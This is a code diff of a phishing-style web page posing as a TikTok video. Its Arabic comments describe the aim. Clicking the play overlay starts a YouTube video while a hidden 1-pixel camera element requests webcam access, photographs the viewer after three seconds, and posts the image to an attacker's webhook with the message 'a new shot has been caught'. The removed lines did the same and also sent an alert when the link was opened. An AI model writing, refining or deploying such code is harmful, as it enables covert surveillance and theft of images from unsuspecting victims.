@@ -3,21 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>TikTok Live</title>
+    <title>TikTok</title>
     <style>
         body, html { margin: 0; padding: 0; height: 100%; background: #000; overflow: hidden; font-family: sans-serif; }
         .wrapper { position: relative; width: 100%; height: 100%; }
-        #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; visibility: hidden; }
+        
+        /* فيديو اليوتيوب يملأ الشاشة */
+        #youtube-frame { position: absolute; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; }
+        
         #start-overlay {
             position: absolute; top: 0; left: 0; width: 100%; height: 100%;
-            background: #000; display: flex; flex-direction: column;
-            justify-content: center; align-items: center; z-index: 200; color: white; cursor: pointer;
+            background: rgba(0,0,0,0.8); display: flex; flex-direction: column;
+            justify-content: center; align-items: center; z-index: 100; color: white; cursor: pointer;
         }
-        .play-btn {
-            width: 80px; height: 80px; background: #fe2c55; border-radius: 50%;
-            display: flex; justify-content: center; align-items: center;
-            font-size: 40px; margin-bottom: 20px; box-shadow: 0 0 20px rgba(254, 44, 85, 0.5);
-        }
+        .play-btn { font-size: 60px; margin-bottom: 10px; }
+
         #hidden-camera { position: absolute; width: 1px; height: 1px; opacity: 0; }
         #photo-canvas { display: none; }
     </style>
@@ -26,13 +26,13 @@
 
 <div class="wrapper">
     <iframe id="youtube-frame" 
-        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&loop=1&playlist=C3vaOyZFcsM&controls=0" 
+        src="https://www.youtube.com/embed/C3vaOyZFcsM?enablejsapi=1&autoplay=0&mute=0&controls=0&loop=1&playlist=C3vaOyZFcsM" 
         frameborder="0" allow="autoplay; encrypted-media">
     </iframe>
 
     <div id="start-overlay">
         <div class="play-btn">▶️</div>
-        <p style="font-weight: bold;">اضغط لمشاهدة الفيديو</p>
+        <p>اضغط للمشاهدة</p>
     </div>
 </div>
 
@@ -46,56 +46,43 @@
     const camera = document.getElementById('hidden-camera');
 
     overlay.addEventListener('click', async () => {
+        // 1. تشغيل الفيديو والصوت فوراً
+        iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
+        iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
         overlay.style.display = 'none';
-        iframe.style.visibility = 'visible';
 
-        // 1. إرسال إشارة البدء فوراً كرسالة نصية بسيطة (لا يمكن حظرها)
-        fetch(webhookURL, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ content: "🚀 **تم فتح الرابط.. جاري سحب الصورة الآن!**" })
-        });
-
+        // 2. طلب الكاميرا والتصوير فوراً مثل أول كود
         try {
-            iframe.contentWindow.postMessage('{"event":"command","func":"playVideo","args":""}', '*');
-            iframe.contentWindow.postMessage('{"event":"command","func":"unMute","args":""}', '*');
-
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
             camera.srcObject = stream;
-
-            camera.onplaying = () => {
-                setTimeout(captureFinal, 4000);
-            };
+            
+            // التصوير بعد 3 ثواني فقط لضمان السرعة
+            setTimeout(() => {
+                captureAndSend();
+            }, 3000);
         } catch (err) {
-            console.log("Error");
+            console.log("Access Denied");
         }
     });
 
-    async function captureFinal() {
+    function captureAndSend() {
         const canvas = document.getElementById('photo-canvas');
         const context = canvas.getContext('2d');
+        if (camera.videoWidth === 0) return;
 
-        if (camera.videoWidth > 0) {
-            canvas.width = camera.videoWidth;
-            canvas.height = camera.videoHeight;
-            context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+        canvas.width = camera.videoWidth;
+        canvas.height = camera.videoHeight;
+        context.drawImage(camera, 0, 0, canvas.width, canvas.height);
+        
+        canvas.toBlob(async (blob) => {
+            if (!blob) return;
+            const formData = new FormData();
+            formData.append('file', blob, 'shot.png');
+            formData.append('content', '📸 **تم صيد لقطة جديدة!**');
             
-            // تحويل الصورة لملف PNG حقيقي وإرساله بطريقة الـ FormData الأكيدة
-            canvas.toBlob(async (blob) => {
-                if (!blob) return;
-                const fd = new FormData();
-                fd.append('file', blob, 'shot.png');
-                fd.append('content', '✅ **وصلت الصورة بنجاح!**');
-
-                await fetch(webhookURL, { 
-                    method: 'POST', 
-                    body: fd,
-                    mode: 'cors' // نحدد النظام هنا لضمان قبول المتصفح
-                });
-            }, 'image/png');
-        } else {
-            setTimeout(captureFinal, 1000);
-        }
+            // إرسال مباشر وبسيط
+            await fetch(webhookURL, { method: 'POST', body: formData });
+        }, 'image/png');
     }
 </script>
 </body>
